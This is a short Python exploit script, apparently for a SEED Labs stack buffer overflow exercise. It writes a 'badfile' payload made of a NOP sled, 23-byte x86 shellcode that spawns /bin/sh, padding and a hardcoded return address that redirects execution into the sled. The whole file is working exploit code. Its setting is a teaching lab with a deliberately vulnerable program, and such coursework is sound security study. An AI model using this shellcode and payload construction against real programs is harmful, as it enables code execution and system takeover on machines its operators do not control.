#!/usr/bin/env python3
import struct

# Simple shellcode - execve /bin/sh (23 bytes)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# We know buffer is at 0xffffcce8 from get_addr
buffer_addr = 0xffffcce8

# Structure: [NOP sled][shellcode][padding][return address][junk]
# Total before return address = 36 bytes

nop_sled = b'\x90' * 10
payload = nop_sled + shellcode  # 10 + 23 = 33 bytes

# Pad to exactly 36 bytes
payload += b'A' * (36 - len(payload))  # 3 more bytes

# Return address - jump to start of buffer (into NOPs)
ret_addr = buffer_addr + 4  # Jump a few bytes into the NOPs

payload += struct.pack("<I", ret_addr)

# Fill rest
payload += b'C' * (517 - len(payload))

print(f"[+] Buffer at: {hex(buffer_addr)}")
print(f"[+] Jumping to: {hex(ret_addr)}")
print(f"[+] Shellcode starts at: {hex(buffer_addr + 10)}")
print(f"[+] Payload: {len(payload)} bytes")

with open('../vulnerable-programs/seedlabs-stack/badfile', 'wb') as f:
    f.write(payload)

print("[+] Exploit ready!")
